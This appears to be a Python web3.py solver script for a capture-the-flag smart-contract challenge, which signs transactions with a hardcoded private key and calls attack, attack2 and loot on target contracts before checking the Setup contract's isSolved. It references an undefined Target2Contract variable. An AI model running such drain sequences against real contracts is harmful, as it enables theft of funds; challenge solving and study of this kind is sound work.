from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from pwn import *

x = {
    "PrivateKey": "0x111573ec6b84119a5681b883c550b028d88b5161c0c7f5d99fff004c079aa31f",
    "Address": "0x5b384f9c6e4b34B7A9e5402392955D79dbC0824C",
    "TargetAddress": "0xE20FEC2D2B809187618337815Bb7E0d369C01b07",
    "setupAddress": "0xD955dddB2bc7699F51837a2fD5820BE6A0C9359D"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

url = 'http://209.97.176.174:30965/rpc'

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
block = w3.eth.getBlock(block_number)
print(block.timestamp)
print(block.number)
print(block_number)

'''
block_number_or_hash = 'latest'
block = w3.eth.getBlock(block_number_or_hash)
print(block.number)
sleep(5)
block_number = w3.eth.block_number
print(block_number)
'''

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)



#solcjs --abi --bin Setup.sol #generate .abi .bin
with open('Setup_sol_Setup.abi','r') as f:
       abi = json.load(f)

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)

account_from = {
        'private_key': PrivateKey,
        'address': account_address,
}

#construct_txn = contract_instance.constructor().buildTransaction(
#       {
#               'from': account_from['address'],
#               'nonce': w3.eth.get_transaction_count(account_from['address']),
#	       'value': 1
#       }
#)

#tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
#tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
#tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

with open('Creature_sol_Creature.abi','r') as f:
        abi = json.load(f)
contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
construct_txn = contract_instance2.functions.attack(1000).build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                'chainId': w3.eth.chain_id,
		#'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

with open('Contract_sol_Contract.abi','r') as f:
        abi = json.load(f)
contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
construct_txn = contract_instance2.functions.attack2().build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                #'from': Target2Address,
                #'nonce': w3.eth.get_transaction_count(Target2Address),
                'chainId': w3.eth.chain_id,
		#'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')

with open('Creature_sol_Creature.abi','r') as f:
        abi = json.load(f)
contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
construct_txn = contract_instance2.functions.loot().build_transaction(
        {
                'from': account_from['address'],
                'nonce': w3.eth.get_transaction_count(account_from['address']),
                'chainId': w3.eth.chain_id,
                #'value' : 1
                #"gasPrice": w3.to_wei(50, 'gwei'),
                #"gas": 21000,
                #"value": w3.to_wei("0", "ether"),
        }
)
tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')


with open('Setup_sol_Setup.abi','r') as f:
        abi = json.load(f)

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved().call()

print(f'The current number stored is: { number } ')
